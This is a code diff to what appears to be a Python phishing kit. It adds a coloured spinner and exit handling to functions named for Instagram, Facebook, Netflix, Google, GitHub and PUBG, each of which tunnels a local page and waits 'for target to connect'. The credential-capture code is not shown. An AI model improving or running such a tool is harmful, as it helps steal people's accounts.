@@ -57,6 +57,17 @@ def Sprint(text):
     sys.stdout.write(character)
     sys.stdout.flush()
     sleep(0.1)
+#smooth rotation====================================================================================================
+def rotation(text):
+    for _ in range(4):
+        print(Fore.BLUE + "[\\]" ,text ,  end= "\r")
+        sleep(0.7)
+        print(Fore.RED + "[|]" , end= "\r")
+        sleep(0.7)
+        print(Fore.CYAN + "[/]" , end= "\r")
+        sleep(0.7)
+        print(Fore.GREEN + "[-]" , end= "\r")
+        sleep(0.7)
 #run with sudo ====================================================================================================
 if os.name == "posix":
     uid = os.getuid()
@@ -138,16 +149,22 @@ def instagram():
     sleep(1)
 
     loaclhost()
-    print(Fore.YELLOW + "please wait 10 second".title() ,end= "\r" + Fore.RESET)
-    sleep(10)
-    print("                       " , end="\r")
+    
+    try:
+        print(" ")
+        rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+    print("                          " , end="\r")
 #====================================================================================================
 
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     sleep(0.1)
     linecache.clearcache()
-    print("")
+    
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n" + Fore.RESET)
     
 #Write info====================================================================================================
@@ -256,15 +273,21 @@ def facebook():
     sleep(1)
 
     loaclhost()
-    print(Fore.YELLOW + "please wait 10 second".title() ,end= "\r" + Fore.RESET)
-    sleep(10)
-    print("                       " , end="\r")
+    
+    try:
+        print(" ")
+        rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+    print("                          " , end="\r")
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     sleep(0.1)
     linecache.clearcache()
-    print("")
+    
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
@@ -371,15 +394,21 @@ def netflix():
     sleep(1)
 
     loaclhost()
-    print(Fore.YELLOW + "please wait 10 second".title() ,end= "\r" + Fore.RESET)
-    sleep(10)
-    print("                       " , end="\r")
+    
+    try:
+        print(" ")
+        rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+    print("                          " , end="\r")
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     sleep(0.1)
     linecache.clearcache()
-    print("")
+    
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
@@ -486,15 +515,21 @@ def Google():
     sleep(1)
 
     loaclhost()
-    print(Fore.YELLOW + "please wait 10 second".title() ,end= "\r" + Fore.RESET)
-    sleep(10)
-    print("                       " , end="\r")
+    
+    try:
+        print(" ")
+        rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+    print("                          " , end="\r")
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     sleep(0.1)
     linecache.clearcache()
-    print("")
+    
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
@@ -600,15 +635,21 @@ def Github():
     sleep(1)
 
     loaclhost()
-    print(Fore.YELLOW + "please wait 10 second".title() ,end= "\r" + Fore.RESET)
-    sleep(10)
-    print("                       " , end="\r")
+    
+    try:
+        print(" ")
+        rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+    print("                          " , end="\r")
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     sleep(0.1)
     linecache.clearcache()
-    print("")
+    
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
@@ -715,15 +756,21 @@ def Pubg():
     sleep(1)
 
     loaclhost()
-    print(Fore.YELLOW + "please wait 10 second".title() ,end= "\r" + Fore.RESET)
-    sleep(10)
-    print("                       " , end="\r")
+    
+    try:
+        print(" ")
+        rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+    print("                          " , end="\r")
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     sleep(0.1)
     linecache.clearcache()
-    print("")
+    
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
         
 #Write info====================================================================================================
